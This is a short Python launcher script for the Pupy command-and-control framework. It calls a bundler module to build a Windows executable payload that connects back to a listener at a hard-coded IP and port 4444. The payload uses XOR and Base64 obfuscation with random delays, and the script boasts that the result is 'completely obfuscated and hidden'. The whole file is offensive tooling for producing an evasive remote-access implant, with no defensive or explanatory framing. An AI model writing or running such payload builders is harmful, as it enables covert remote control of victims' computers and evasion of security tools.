#!/usr/bin/env python3
"""
Pupy C2 Manager - Payload Trigger
This file triggers the Pupy bundler with the configured listener settings.
"""

from src.pupy_bundler import PupyBundler

if __name__ == '__main__':
    # Configuration
    listener_ip = "192.168.1.40"
    listener_port = 4444
    obfuscation_level = 2  # Level 2 - XOR + Base64 + Random Delays (RECOMMENDED)
    platform = "windows"
    
    print("[*] Creating Pupy payload bundler...")
    print(f"[*] Listener: {listener_ip}:{listener_port}")
    print(f"[*] Obfuscation: Level {obfuscation_level}")
    
    bundler = PupyBundler(
        listener_ip=listener_ip,
        listener_port=listener_port,
        obfuscation_level=obfuscation_level,
        platform=platform
    )
    
    success = bundler.bundle(output_name="pupy_payload")
    
    if success:
        print("\n[+] Pupy payload created successfully!")
        print("[+] Location: dist/pupy_payload.exe")
        print("[+] Pupy is completely obfuscated and hidden!")
    else:
        print("\n[!] Failed to create Pupy payload")
        exit(1)
